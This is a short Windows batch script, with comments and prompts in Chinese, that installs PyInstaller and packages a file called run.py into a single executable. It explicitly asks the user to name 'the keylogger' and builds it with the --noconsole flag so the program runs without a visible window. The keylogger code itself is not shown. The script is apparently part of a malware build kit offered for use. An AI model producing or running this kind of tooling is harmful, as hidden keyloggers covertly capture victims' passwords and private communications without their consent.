@echo off
REM ################################################

REM 检查是否安装了 pip
where pip >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo 未安装 pip。请先安装 pip 后继续。
    pause
    exit /b 1
)

REM 安装 pyinstaller（显示详细输出）
echo 正在安装 pyinstaller...
pip3 install pyinstaller -v
if %ERRORLEVEL% neq 0 (
    echo 安装 pyinstaller 失败。正在退出。
    pause
    exit /b 1
)

REM 提示用户输入键盘记录器的名称
set /p name="请输入您想要给键盘记录器起的名字: "

REM 验证用户输入
if "%name%"=="" (
    echo 未提供名称。正在退出。
    pause
    exit /b 1
)

REM 使用指定名称运行 PyInstaller
echo 正在使用 PyInstaller 创建可执行文件...
pyinstaller --onefile --name "%name%" --noconsole run.py
if %ERRORLEVEL% neq 0 (
    echo 创建可执行文件失败。请检查 PyInstaller 的输出以了解错误详情。
    pause
    exit /b 1
)

echo 可执行文件创建成功。

REM 暂停以保持窗口打开（可选）
pause
